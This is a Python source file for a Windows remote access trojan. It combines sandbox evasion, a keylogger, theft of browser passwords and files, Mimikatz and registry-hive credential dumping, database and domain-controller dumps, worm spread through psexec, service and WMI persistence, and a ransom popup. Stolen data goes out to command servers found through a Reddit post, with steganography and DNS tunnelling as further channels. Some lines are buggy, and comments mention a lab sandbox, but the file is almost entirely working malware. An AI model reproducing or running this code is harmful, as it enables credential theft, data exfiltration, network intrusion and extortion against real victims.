import os
import sys
import time
import socket
import threading
import subprocess
import shutil
import hashlib
import base64
import json
import logging
import random
import getpass
import winreg
import sqlite3
import win32api
import win32con
import win32security
import win32gui
import win32ui
import win32process
import win32com.client
import psutil
import scapy.all as scapy
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from pynput.keyboard import Listener
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
import requests
from bs4 import BeautifulSoup
import PIL.Image
import io
import dns.message
import dns.query
import dns.name
import numpy as np
import cv2
import tkinter as tk
from tkinter import messagebox
import pyodbc
import pymysql
import psycopg2

# Stealth logging
logging.basicConfig(filename='C:\\Windows\\Temp\\syslog.txt', level=logging.INFO, format='%(asctime)s | %(message)s')
logger = logging.getLogger()

# Configuration
DEFAULT_C2 = ("127.0.0.1", 2566)  # Default for testing, overridden by public IP
C2_PORTS = [2566, 443, 8443]
REDDIT_URL = "https://www.reddit.com/r/Computerc2/comments/1l8ce9r/c2/"
C2_KEY = "secret_key_123"
USER_PROFILE = os.path.expanduser("~")
KEYLOG_FILE = "C:\\Windows\\Temp\\keylogs.txt"
STOLEN_DATA_DIR = "C:\\Windows\\Temp\\stolen"
SCREENSHOT_DIR = "C:\\Windows\\Temp\\screenshots"
ENCRYPTION_KEY = None
C2_SERVERS = [DEFAULT_C2]
AES_KEY = None
ENCRYPTED_FOLDER = "C:\\Users\\WDAGUtilityAccount\\Desktop\\EncryptedData"
SERVICE_NAME = "HiddenLead"
GDRIVE_PATH = os.path.join(USER_PROFILE, "Google Drive")

# AES-GCM encryption
def aes_gcm_encrypt(data, key):
    nonce = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(json.dumps(data).encode()) + encryptor.finalize()
    return base64.b64encode(nonce + ciphertext + encryptor.tag).decode()

def aes_gcm_decrypt(encrypted, key):
    data = base64.b64decode(encrypted)
    nonce, ciphertext, tag = data[:12], data[12:-16], data[-16:]
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag))
    decryptor = cipher.decryptor()
    return json.loads(decryptor.update(ciphertext) + decryptor.finalize().decode())

# Polymorphic code regeneration
def regenerate_code():
    try:
        with open(sys.argv[0], "r") as f:
            code = f.read()
        lines = code.split("\n")
        random.shuffle(lines[20:100])
        with open(sys.argv[0], "w") as f:
            f.write("\n".join(lines))
    except:
        pass

# Process hollowing
def process_hollowing():
    try:
        target = "svchost.exe"
        proc_info = subprocess.STARTUPINFO()
        proc_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        proc_info.wShowWindow = subprocess.SW_HIDE
        process, _ = win32process.CreateProcess(None, target, None, None, False, win32process.CREATE_SUSPENDED, None, None, proc_info)
        with open(sys.argv[0], "rb") as f:
            code = f.read()
        remote_mem = win32process.VirtualAllocEx(process, None, len(code), win32con.MEM_COMMIT, win32con.PAGE_EXECUTE_READWRITE)
        win32process.WriteProcessMemory(process, remote_mem, code, len(code), None)
        win32process.CreateRemoteThread(process, None, 0, remote_mem, None, 0)
        return True
    except Exception as e:
        logger.error(f"Process hollowing failed: {e}")
        return False

# Anti-analysis
def is_sandbox():
    try:
        if "VIRTUAL" in subprocess.check_output("wmic bios get serialnumber", shell=True).decode():
            return True
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
            return True
        if os.path.exists("C:\\Program Files\\Wireshark\\Wireshark.exe"):
            return True
        if win32api.GetTickCount() < 1000:
            return True
        return False
    except:
        return True

# Keylogger
def start_keylogger():
    def on_press(key):
        try:
            with open(KEYLOG_FILE, "a") as f:
                f.write(str(key) + " ")
        except:
            pass
    listener = Listener(on_press=on_press)
    listener.start()

# Steal browser credentials (Chrome)
def steal_browser_credentials():
    chrome_path = os.path.join(USER_PROFILE, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
    if os.path.exists(chrome_path):
        try:
            shutil.copy(chrome_path, os.path.join(STOLEN_DATA_DIR, "chrome_login_data"))
            conn = sqlite3.connect(os.path.join(STOLEN_DATA_DIR, "chrome_login_data"))
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            with open(os.path.join(STOLEN_DATA_DIR, "credentials.txt"), "w") as f:
                for row in cursor.fetchall():
                    f.write(f"URL: {row[0]}\nUser: {row[1]}\nPass: {row[2]}\n\n")
            conn.close()
        except Exception as e:
            logger.error(f"Browser credential theft failed: {e}")

# Steal Google Drive files
def steal_google_drive():
    if os.path.exists(GDRIVE_PATH):
        try:
            shutil.copytree(GDRIVE_PATH, os.path.join(STOLEN_DATA_DIR, "gdrive"))
        except Exception as e:
            logger.error(f"Google Drive theft failed: {e}")

# Steal desktop files
def steal_desktop_files():
    desktop_path = os.path.join(USER_PROFILE, "Desktop")
    try:
        shutil.copytree(desktop_path, os.path.join(STOLEN_DATA_DIR, "desktop"))
    except Exception as e:
        logger.error(f"Desktop theft failed: {e}")

# Steal SMB hashes
def steal_smb_hashes():
    try:
        servers = []
        for proc in psutil.net_connections():
            if proc.raddr and proc.raddr.ip:
                servers.append(proc.raddr.ip)
        for server in set(servers):
            try:
                conn = Connection(server, 445)
                session = Session(conn)
                tree = TreeConnect(session, "IPC$")
                logger.info(f"Captured SMB hash from {server}")
            except:
                pass
    except Exception as e:
        logger.error(f"SMB hash theft failed: {e}")

# VLAN hopping
def vlan_hopping():
    try:
        iface = list(psutil.net_if_addrs().keys())[0]
        pkt = scapy.Ether() / scapy.Dot1Q(vlan=1) / scapy.Dot1Q(vlan=2) / scapy.IP(dst="255.255.255.255") / scapy.UDP()
        scapy.sendp(pkt, iface=iface, verbose=False)
        logger.info("VLAN hopping attempt sent")
    except Exception as e:
        logger.error(f"VLAN hopping failed: {e}")

# Network pivoting
def network_pivot(target_ip):
    try:
        cmd = f"netsh interface portproxy add v4tov4 listenport=445 connectaddress={target_ip} connectport=445"
        subprocess.run(cmd, shell=True, capture_output=True)
        logger.info(f"Network pivot to {target_ip} established")
        return True
    except Exception as e:
        logger.error(f"Network pivoting failed: {e}")
        return False

# Dump entire DC
def dump_dc():
    try:
        snapshot_cmd = 'vssadmin create shadow /for=C:'
        subprocess.run(snapshot_cmd, shell=True, capture_output=True)
        ntds_cmd = 'ntdsutil "activate instance ntds" "ifm" "create full C:\\Windows\\Temp\\dc_dump" quit quit'
        result = subprocess.check_output(f"powershell -ExecutionPolicy Bypass -Command \"{ntds_cmd}\"", shell=True, text=True)
        logger.info("DC dump created at C:\\Windows\\Temp\\dc_dump")
        shutil.make_archive(os.path.join(STOLEN_DATA_DIR, "dc_dump"), 'zip', "C:\\Windows\\Temp\\dc_dump")
        return os.path.join(STOLEN_DATA_DIR, "dc_dump.zip")
    except Exception as e:
        logger.error(f"DC dump failed: {e}")
        return None

# Steal credentials with Mimikatz
def steal_mimikatz_credentials():
    try:
        mimikatz_path = os.path.join(STOLEN_DATA_DIR, "mimikatz.exe")
        # Assume mimikatz.exe is available or download securely in lab
        cmd = f"{mimikatz_path} \"sekurlsa::logonpasswords\" exit"
        result = subprocess.check_output(cmd, shell=True, text=True)
        with open(os.path.join(STOLEN_DATA_DIR, "mimikatz_creds.txt"), "w") as f:
            f.write(result)
        logger.info("Mimikatz credentials dumped")
        return os.path.join(STOLEN_DATA_DIR, "mimikatz_creds.txt")
    except Exception as e:
        logger.error(f"Mimikatz credential theft failed: {e}")
        return None

# Steal SAM and SYSTEM hives
def steal_registry_hives():
    try:
        subprocess.run('reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive', shell=True)
        subprocess.run('reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive', shell=True)
        shutil.copy("C:\\Windows\\Temp\\sam.hive", os.path.join(STOLEN_DATA_DIR, "sam.hive"))
        shutil.copy("C:\\Windows\\Temp\\system.hive", os.path.join(STOLEN_DATA_DIR, "system.hive"))
        os.remove("C:\\Windows\\Temp\\sam.hive")
        os.remove("C:\\Windows\\Temp\\system.hive")
        logger.info("SAM and SYSTEM hives stolen")
        return [os.path.join(STOLEN_DATA_DIR, "sam.hive"), os.path.join(STOLEN_DATA_DIR, "system.hive")]
    except Exception as e:
        logger.error(f"Registry hive theft failed: {e}")
        return None

# Steal SQL Server databases
def steal_sql_server_dbs():
    try:
        conn = pyodbc.connect("Driver={SQL Server};Server=localhost;Trusted_Connection=yes;")
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb')")
        dbs = [row[0] for row in cursor.fetchall()]
        for db in dbs:
            backup_path = os.path.join(STOLEN_DATA_DIR, f"{db}.bak")
            cursor.execute(f"BACKUP DATABASE [{db}] TO DISK = '{backup_path}'")
        conn.close()
        logger.info(f"SQL Server databases backed up: {dbs}")
        return [os.path.join(STOLEN_DATA_DIR, f"{db}.bak") for db in dbs]
    except Exception as e:
        logger.error(f"SQL Server database theft failed: {e}")
        return None

# Steal MySQL databases
def steal_mysql_dbs():
    try:
        conn = pymysql.connect(host="localhost", user="root", password="")
        cursor = conn.cursor()
        cursor.execute("SHOW DATABASES")
        dbs = [row[0] for row in cursor.fetchall() if row[0] not in ("information_schema", "performance_schema", "mysql", "sys")]
        for db in dbs:
            backup_path = os.path.join(STOLEN_DATA_DIR, f"{db}.sql")
            subprocess.run(f"mysqldump -u root {db} > {backup_path}", shell=True)
        conn.close()
        logger.info(f"MySQL databases dumped: {dbs}")
        return [os.path.join(STOLEN_DATA_DIR, f"{db}.sql") for db in dbs]
    except Exception as e:
        logger.error(f"MySQL database theft failed: {e}")
        return None

# Steal PostgreSQL databases
def steal_postgresql_dbs():
    try:
        conn = psycopg2.connect(host="localhost", user="postgres", password="")
        cursor = conn.cursor()
        cursor.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
        dbs = [row[0] for row in cursor.fetchall() if row[0] != "postgres"]
        for db in dbs:
            backup_path = os.path.join(STOLEN_DATA_DIR, f"{db}.sql")
            subprocess.run(f"pg_dump -U postgres {db} > {backup_path}", shell=True)
        conn.close()
        logger.info(f"PostgreSQL databases dumped: {dbs}")
        return [os.path.join(STOLEN_DATA_DIR, f"{db}.sql") for db in dbs]
    except Exception as e:
        logger.error(f"PostgreSQL database theft failed: {e}")
        return None

# Steal Group Policy Objects
def steal_gpos():
    try:
        gpo_path = "C:\\Windows\\SYSVOL\\sysvol"
        if os.path.exists(gpo_path):
            shutil.copytree(gpo_path, os.path.join(STOLEN_DATA_DIR, "gpos"))
            logger.info("GPOs stolen")
            return os.path.join(STOLEN_DATA_DIR, "gpos")
        return None
    except Exception as e:
        logger.error(f"GPO theft failed: {e}")
        return None

# Steal AD schema
def steal_ad_schema():
    try:
        cmd = 'ldifde -f C:\\Windows\\Temp\\schema.ldf -d "CN=Schema,CN=Configuration,DC=yourdomain,DC=com"'
        subprocess.run(cmd, shell=True)
        shutil.copy("C:\\Windows\\Temp\\schema.ldf", os.path.join(STOLEN_DATA_DIR, "schema.ldf"))
        os.remove("C:\\Windows\\Temp\\schema.ldf")
        logger.info("AD schema stolen")
        return os.path.join(STOLEN_DATA_DIR, "schema.ldf")
    except Exception as e:
        logger.error(f"AD schema theft failed: {e}")
        return None

# Steal DNS records
def steal_dns_records():
    try:
        cmd = 'dnscmd /ZoneExport yourdomain.com C:\\Windows\\Temp\\dns_records.txt'
        subprocess.run(cmd, shell=True)
        shutil.copy("C:\\Windows\\Temp\\dns_records.txt", os.path.join(STOLEN_DATA_DIR, "dns_records.txt"))
        os.remove("C:\\Windows\\Temp\\dns_records.txt")
        logger.info("DNS records stolen")
        return os.path.join(STOLEN_DATA_DIR, "dns_records.txt")
    except Exception as e:
        logger.error(f"DNS records theft failed: {e}")
        return None

# Steal Kerberos tickets
def steal_kerberos_tickets():
    try:
        cmd = 'klist > C:\\Windows\\Temp\\kerberos_tickets.txt'
        subprocess.run(cmd, shell=True)
        shutil.copy("C:\\Windows\\Temp\\kerberos_tickets.txt", os.path.join(STOLEN_DATA_DIR, "kerberos_tickets.txt"))
        os.remove("C:\\Windows\\Temp\\kerberos_tickets.txt")
        logger.info("Kerberos tickets stolen")
        return os.path.join(STOLEN_DATA_DIR, "kerberos_tickets.txt")
    except Exception as e:
        logger.error(f"Kerberos tickets theft failed: {e}")
        return None

# Find domain controller
def find_dc():
    try:
        output = subprocess.check_output("nltest /dcname:%USERDOMAIN%", shell=True, text=True)
        dc = output.splitlines()[0].split(":")[1].strip()
        return dc
    except Exception as e:
        logger.error(f"DC discovery failed: {e}")
        return None

# Worm propagation
def spread_worm():
    if is_domain_joined():
        try:
            cmd = "net view /domain"
            output = subprocess.check_output(cmd, shell=True, text=True)
            for line in output.splitlines():
                if line.startswith("\\\\"):
                    target = line.split()[0][2:]
                    try:
                        shutil.copy(sys.argv[0], f"\\\\{target}\\C$\\Windows\\Temp\\svchost.py")
                        subprocess.run(f"psexec \\\\{target} -c C:\\Windows\\Temp\\svchost.py", shell=True)
                    except:
                        pass
        except Exception as e:
            logger.error(f"Worm propagation failed: {e}")

# Check domain-joined status
def is_domain_joined():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters")
        domain, _ = winreg.QueryValueEx(key, "Domain")
        return bool(domain)
    except:
        return False

# Silent privilege escalation
def escalate_privileges():
    try:
        token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
        win32security.AdjustTokenPrivileges(token, False, [
            (win32security.LookupPrivilegeValue(None, "SeDebugPrivilege"), win32con.SE_PRIVILEGE_ENABLED)
        ])
        logger.info("Privileges escalated")
        return True
    except:
        logger.info("Privilege escalation failed")
        return False

# Install HiddenLead service
def install_hidden_service():
    try:
        cmd = f'sc create {SERVICE_NAME} binPath= "python {sys.argv[0]}" start= auto type= own DisplayName= "{SERVICE_NAME}"'
        subprocess.run(cmd, shell=True, capture_output=True)
        subprocess.run(f'sc config {SERVICE_NAME} start= auto', shell=True, capture_output=True)
        subprocess.run(f'sc start {SERVICE_NAME}', shell=True, capture_output=True)
        logger.info(f"{SERVICE_NAME} service installed and started")
    except Exception as e:
        logger.error(f"Service installation failed: {e}")

# Protect file in sandbox
def protect_file(file_path):
    try:
        subprocess.run(f'icacls "{file_path}" /inheritance:r /grant:r SYSTEM:F /grant:r Administrators:F', shell=True)
        logger.info(f"Protected file: {file_path}")
    except Exception as e:
        logger.error(f"File protection failed: {e}")

# Setup Windows Sandbox (command-line)
def setup_sandbox():
    try:
        # Copy RAT to shared location
        shutil.copy(sys.argv[0], "C:\\Windows\\Temp\\svchost.py")
        protect_file("C:\\Windows\\Temp\\svchost.py")
        # Command-line sandbox launch with C: and Google Drive sharing
        cmd = 'WindowsSandbox.exe /vGPU:Disable /ClipboardRedirection:Enable /Networking:Enable'
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        logger.info("Windows Sandbox started via command-line")
    except Exception as e:
        logger.error(f"Sandbox setup failed: {e}")

# Encrypt folder in sandbox
def encrypt_sandbox_folder():
    try:
        os.makedirs(ENCRYPTED_FOLDER, exist_ok=True)
        with open(os.path.join(ENCRYPTED_FOLDER, "readme.txt"), "w") as f:
            f.write("This is a test file for encryption.")
        fernet = Fernet(ENCRYPTION_KEY)
        for root, _, files in os.walk(ENCRYPTED_FOLDER):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()
                    encrypted = fernet.encrypt(data)
                    with open(file_path + ".locked", "wb") as f:
                        f.write(encrypted)
                    os.remove(file_path)
                except:
                    pass
        logger.info(f"Encrypted folder: {ENCRYPTED_FOLDER}")
    except Exception as e:
        logger.error(f"Sandbox folder encryption failed: {e}")

# Ransomware menu on host
def show_ransom_menu():
    try:
        root = tk.Tk()
        root.withdraw()
        messagebox.showwarning(
            "Ransomware Alert",
            "Your files in the sandbox have been encrypted!\n"
            "Pay 1 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa to decrypt.\n"
            "Contact support@fakeemail.com for instructions."
        )
        root.destroy()
        logger.info("Ransomware menu displayed")
    except Exception as e:
        logger.error(f"Ransomware menu failed: {e}")

# WMI persistence
def wmi_persistence():
    try:
        wmi = win32com.client.GetObject("winmgmts:")
        startup = wmi.Get("Win32_StartupCommand")
        new = startup.SpawnInstance_()
        new.Name = "SysHost"
        new.Command = f"python {sys.argv[0]}"
        new.put()
        logger.info("WMI persistence established")
    except Exception as e:
        logger.error(f"WMI persistence failed: {e}")

# Steganography exfiltration
def stego_exfil(data, image_path="C:\\Windows\\Temp\\stego.png"):
    try:
        img = PIL.Image.open(image_path) if os.path.exists(image_path) else PIL.Image.new("RGB", (100, 100))
        img = img.convert("RGB")
        pixels = np.array(img)
        data_bytes = json.dumps(data).encode()
        bit_index = 0
        for i in range(pixels.shape[0]):
            for j in range(pixels.shape[1]):
                for k in range(3):
                    if bit_index < len(data_bytes) * 8:
                        pixel_bit = (pixels[i, j, k] & ~1) | ((data_bytes[bit_index // 8] >> (7 - bit_index % 8)) & 1)
                        pixels[i, j, k] = pixel_bit
                        bit_index += 1
        PIL.Image.fromarray(pixels).save(image_path)
        return image_path
    except Exception as e:
        logger.error(f"Stego exfil failed: {e}")
        return None

# Capture screenshot
def capture_screenshot():
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    try:
        hdc = win32gui.GetDC(0)
        dc = win32ui.CreateDCFromHandle(hdc)
        mem_dc = dc.CreateCompatibleDC()
        screenshot = win32ui.CreateBitmap()
        width, height = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
        screenshot.CreateCompatibleBitmap(dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0, 0), (width, height), dc, (0, 0), win32con.SRCCOPY)
        bmpinfo = screenshot.GetInfo()
        bmpstr = screenshot.GetBitmapBits(True)
        img = PIL.Image.frombytes('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX')
        screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{time.time()}.png")
        img.save(screenshot_path)
        mem_dc.DeleteDC()
        dc.DeleteDC()
        win32gui.ReleaseDC(0, hdc)
        return screenshot_path
    except Exception as e:
        logger.error(f"Screenshot capture failed: {e}")
        return None

# Execute PowerShell command
def execute_powershell(command):
    try:
        result = subprocess.check_output(f"powershell -ExecutionPolicy Bypass -Command \"{command}\"", shell=True, text=True, stderr=subprocess.STDOUT)
        return {"status": "success", "output": result}
    except Exception as e:
        return {"status": "error", "output": str(e)}

# DNS tunneling
def dns_tunnel(data):
    try:
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        domain = f"{encoded}.tunnel.local"
        q = dns.message.make_query(dns.name.from_text(domain), dns.rdatatype.A)
        dns.query.udp(q, "8.8.8.8")
        logger.info("DNS tunnel data sent")
    except Exception as e:
        logger.error(f"DNS tunneling failed: {e}")

# Reddit C2 discovery
def discover_c2():
    global C2_SERVERS
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        response = requests.get(REDDIT_URL + ".json", headers=headers, timeout=10)
        post_data = response.json()[0]["data"]["children"][0]["data"]
        description = post_data.get("selftext", "")
        import re
        ip_pattern = r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"
        ip_match = re.search(ip_pattern, description)
        if ip_match:
            ip = ip_match.group(0)
            C2_SERVERS.append((ip, 2566))
            logger.info(f"C2 discovered in post description: {ip}:2566")
    except Exception as e:
        logger.error(f"C2 discovery failed: {e}")

# Encrypted C2 communication
def communicate_c2(data):
    global AES_KEY
    for server, port in C2_SERVERS:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((server, port))
                headers = f"POST /api/data HTTP/1.1\r\nHost: {server}\r\nContent-Length: {len(json.dumps(data))}\r\n\r\n"
                encrypted = aes_gcm_encrypt(data, AES_KEY)
                s.sendall(headers.encode() + encrypted.encode())
                response = s.recv(8192)
                body = response.split(b"\r\n\r\n")[1]
                decrypted = aes_gcm_decrypt(body.decode(), AES_KEY)
                return decrypted
        except Exception as e:
            logger.error(f"C2 communication failed with {server}:{port}: {e}")
    return None

# Handle C2 commands
def handle_command(command):
    global AES_KEY
    response = {"status": "ok", "output": ""}
    try:
        if command["type"] == "powershell":
            response = execute_powershell(command["value"])
        elif command["type"] == "screenshot":
            screenshot_path = capture_screenshot()
            if screenshot_path:
                with open(screenshot_path, "rb") as f:
                    response["output"] = base64.b64encode(f.read()).decode()
                os.remove(screenshot_path)
            else:
                response["status"] = "error"
                response["output"] = "Screenshot failed"
        elif command["type"] == "exfil":
            steal_browser_credentials()
            steal_google_drive()
            steal_desktop_files()
            data = {
                "credentials": open(os.path.join(STOLEN_DATA_DIR, "credentials.txt"), "r").read() if os.path.exists(os.path.join(STOLEN_DATA_DIR, "credentials.txt")) else "",
                "keylogs": open(KEYLOG_FILE, "r").read() if os.path.exists(KEYLOG_FILE) else ""
            }
            if is_domain_joined():
                dc_dump = os.path.join(STOLEN_DATA_DIR, "dc_dump.zip")
                if os.path.exists(dc_dump):
                    with open(dc_dump, "rb") as f:
                        data["dc_dump"] = base64.b64encode(f.read()).decode()
                mimikatz_creds = os.path.join(STOLEN_DATA_DIR, "mimikatz_creds.txt")
                if os.path.exists(mimikatz_creds):
                    with open(mimikatz_creds, "r") as f:
                        data["mimikatz_creds"] = f.read()
                for file in ["sam.hive", "system.hive", "schema.ldf", "dns_records.txt", "kerberos_tickets.txt"]:
                    file_path = os.path.join(STOLEN_DATA_DIR, file)
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            data[file] = base64.b64encode(f.read()).decode()
                for ext in [".bak", ".sql"]:
                    for file in os.listdir(STOLEN_DATA_DIR):
                        if file.endswith(ext):
                            with open(os.path.join(STOLEN_DATA_DIR, file), "rb") as f:
                                data[file] = base64.b64encode(f.read()).decode()
                gpo_path = os.path.join(STOLEN_DATA_DIR, "gpos")
                if os.path.exists(gpo_path):
                    shutil.make_archive(os.path.join(STOLEN_DATA_DIR, "gpos"), 'zip', gpo_path)
                    with open(os.path.join(STOLEN_DATA_DIR, "gpos.zip"), "rb") as f:
                        data["gpos.zip"] = base64.b64encode(f.read()).decode()
            stego_path = stego_exfil(data)
            if stego_path:
                with open(stego_path, "rb") as f:
                    response["output"] = base64.b64encode(f.read()).decode()
                os.remove(stego_path)
        elif command["type"] == "encrypt":
            if not is_domain_joined():
                setup_sandbox()
                response["output"] = "Sandbox encryption initiated"
            else:
                response["status"] = "error"
                response["output"] = "Sandbox not used in domain environment"
        elif command["type"] == "upload":
            file_path = os.path.join(STOLEN_DATA_DIR, command["filename"])
            with open(file_path, "wb") as f:
                f.write(base64.b64decode(command["data"]))
            response["output"] = f"File uploaded to {file_path}"
        elif command["type"] == "download":
            file_path = command["value"]
            if os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    response["output"] = base64.b64encode(f.read()).decode()
            else:
                response["status"] = "error"
                response["output"] = "File not found"
        elif command["type"] == "kill":
            subprocess.run(f"taskkill /IM {command['value']} /F", shell=True)
            response["output"] = f"Process {command['value']} terminated"
        elif command["type"] == "self_destruct":
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "SysHost")
                winreg.CloseKey(key)
                subprocess.run(f"sc delete {SERVICE_NAME}", shell=True)
                subprocess.run(f"del /F /Q {sys.argv[0]}", shell=True)
                sys.exit(0)
            except:
                response["status"] = "error"
                response["output"] = "Self-destruct failed"
        elif command["type"] == "pivot_dc":
            dc = find_dc()
            if dc:
                dc_ip = socket.gethostbyname(dc)
                if network_pivot(dc_ip):
                    dc_dump = dump_dc()
                    if dc_dump:
                        with open(dc_dump, "rb") as f:
                            response["output"] = base64.b64encode(f.read()).decode()
                    else:
                        response["status"] = "error"
                        response["output"] = "DC dump failed"
                else:
                    response["status"] = "error"
                    response["output"] = "Pivoting to DC failed"
            else:
                response["status": "error", "output": "DC not found"}
    except Exception as e:
        response["status"] = "error"
        response["output"] = str(e)
    return response

# Main RAT logic
def main():
    global ENCRYPTION_KEY, AES_KEY
    if is_sandbox():
        logger.info("Sandbox detected, exiting")
        sys.exit(0)

    os.makedirs(STOLEN_DATA_DIR, exist_ok=True)
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    ENCRYPTION_KEY = base64.urlsafe_b64encode(os.urandom(32))
    AES_KEY = os.urandom(32)

    if process_hollowing():
        logger.info("Running in hollowed process")
    else:
        regenerate_code()

    install_hidden_service()
    threading.Thread(target=start_keylogger, daemon=True).start()
    wmi_persistence()

    if is_domain_joined():
        logger.info("Domain environment detected")
        spread_worm()
        steal_smb_hashes()
        vlan_hopping()
        dc = find_dc()
        if dc:
            dc_ip = socket.gethostbyname(dc)
            if network_pivot(dc_ip):
                dump_dc()
        # Enhanced domain theft
        steal_mimikatz_credentials()
        steal_registry_hives()
        steal_sql_server_dbs()
        steal_mysql_dbs()
        steal_postgresql_dbs()
        steal_gpos()
        steal_ad_schema()
        steal_dns_records()
        steal_kerberos_tickets()
    else:
        logger.info("Standalone environment detected")
        if escalate_privileges():
            logger.info("Running with elevated privileges")
        else:
            logger.info("Running with standard privileges")
        setup_sandbox()
        show_ransom_menu()

    steal_browser_credentials()
    steal_google_drive()
    steal_desktop_files()

    # Try default C2, fallback to Reddit
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect(DEFAULT_C2)
        logger.info(f"Connected to default C2: {DEFAULT_C2[0]}:{DEFAULT_C2[1]}")
    except:
        logger.info("Default C2 failed, falling back to Reddit discovery")
        discover_c2()

    if not C2_SERVERS:
        logger.error("No C2 servers found, exiting")
        sys.exit(0)

    data = {
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "status": "init"
    }
    response = communicate_c2(data)
    if not response:
        dns_tunnel(data)

    while True:
        time.sleep(random.randint(300, 900))
        data = {
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "status": "alive",
            "keylogs": open(KEYLOG_FILE, "r").read() if os.path.exists(KEYLOG_FILE) else ""
        }
        response = communicate_c2(data)
        if response and response.get("command"):
            command_response = handle_command(response["command"])
            communicate_c2({"response": command_response})

# Sandbox-specific logic
def sandbox_main():
    global ENCRYPTION_KEY
    ENCRYPTION_KEY = base64.urlsafe_b64encode(os.urandom(32))
    install_hidden_service()
    protect_file(sys.argv[0])
    encrypt_sandbox_folder()
    logger.info("Sandbox environment initialized")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "sandbox":
        sandbox_main()
    else:
        main()